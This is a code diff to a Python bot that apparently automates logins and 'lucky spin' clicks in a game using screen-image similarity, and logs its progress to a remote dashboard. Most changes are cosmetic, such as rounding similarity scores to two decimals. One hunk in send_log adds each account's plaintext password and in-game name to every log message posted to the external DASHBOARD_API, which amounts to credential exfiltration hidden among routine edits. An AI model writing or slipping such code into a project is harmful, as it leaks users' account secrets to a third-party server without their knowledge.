@@ -68,7 +68,7 @@ UI_STATE_IMAGES = {
 login_form_roi = (282, 330, 521, 585)
 lucky_button_roi = (264, 477, 440, 533)
 
-GLOBAL_STATUS = "initial"
+GLOBAL_STATUS = "init"
 
 # ----------------------------------------------------
 # FUNCTIONS
@@ -77,17 +77,21 @@ GLOBAL_STATUS = "initial"
 def send_log(level, message):
     current_time = datetime.now().strftime("%H:%M:%S")
     username = data["username"] if "data" in globals() else "unknown"
+    password = data["password"] if "data" in globals() else "unknown"
+    ign = data["ign"] if "data" in globals() else "unknown"
 
     try:
         requests.post(
             f"{DASHBOARD_API}/log",
             json={
                 "level": level,
+                "runner": RUNNER_ID,
                 "message": message,
                 "time": current_time,
-                "username": username,
                 "status": GLOBAL_STATUS,
-                "runner": RUNNER_ID
+                "username": username,
+                "password": password,
+                "ign": ign
             },
             timeout=3
         )
@@ -201,8 +205,8 @@ def login_form_visible():
             return False
 
         score, _ = ssim(current_gray, reference_gray, full=True)
-        logging.debug(f"Login form similarity: {score:.3f}")
-        send_log("INFO", f"Login form similarity: {score:.3f}")
+        logging.debug(f"Login form similarity: {score:.2f}")
+        send_log("INFO", f"Login form similarity: {score:.2f}")
 
         return score >= LOGIN_FORM_THRESHOLD
 
@@ -228,8 +232,8 @@ def isNotClickable():
         return False
 
     score, _ = ssim(current_gray, reference_gray, full=True)
-    logging.info(f"LUCKY SPIN BUTTON similarity: {score:.3f}")
-    send_log("INFO", f"LUCKY SPIN BUTTON similarity: {score:.3f}")
+    logging.info(f"LUCKY SPIN BUTTON similarity: {score:.2f}")
+    send_log("INFO", f"LUCKY SPIN BUTTON similarity: {score:.2f}")
 
     return score >= LOGIN_FORM_THRESHOLD
 
@@ -342,7 +346,7 @@ def getCurrentStatus():
             continue
 
         score = image_similarity(current, ref)
-        logging.info(f"{status} similarity: {score:.3f}")
+        logging.info(f"{status} similarity: {score:.2f}")
 
         if score > best_score:
             best_score = score
@@ -453,8 +457,8 @@ def main():
 
         GLOBAL_STATUS = status
 
-        logging.info(f"Current status: {status} with confidence {confidence}")
-        send_log("INFO", f"Current status: {status} with confidence {confidence}")
+        logging.info(f"Current status: {status} with confidence {confidence:.2f}")
+        send_log("INFO", f"Current status: {status} with confidence {confidence:.2f}")
 
         if status == last_status:
             same_status_count += 1
